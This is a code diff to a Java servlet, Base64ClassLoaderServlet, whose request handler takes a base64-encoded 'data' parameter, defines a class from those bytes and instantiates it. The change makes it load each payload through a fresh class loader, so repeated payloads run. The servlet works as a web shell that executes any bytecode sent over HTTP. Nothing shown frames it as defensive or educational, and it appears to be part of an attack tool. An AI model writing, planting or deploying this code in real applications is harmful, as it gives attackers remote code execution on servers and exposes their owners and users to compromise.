@@ -7,6 +7,12 @@ import java.io.IOException;
  */
 public class Base64ClassLoaderServlet extends ClassLoader implements Servlet {
 
+    public Base64ClassLoaderServlet() {}
+
+    public Base64ClassLoaderServlet(ClassLoader parent) {
+        super(parent);
+    }
+
     @Override
     public void init(ServletConfig config) throws ServletException {
 
@@ -22,7 +28,7 @@ public class Base64ClassLoaderServlet extends ClassLoader implements Servlet {
         String data = req.getParameter("data");
         try {
             byte[] bytes = decodeBase64(data);
-            Object obj = defineClass(null, bytes, 0, bytes.length).newInstance();
+            Object obj = new Base64ClassLoaderServlet(Thread.currentThread().getContextClassLoader()).defineClass(null, bytes, 0, bytes.length).newInstance();
             res.getWriter().print(obj);
         } catch (Exception e) {
             throw new RuntimeException(e);
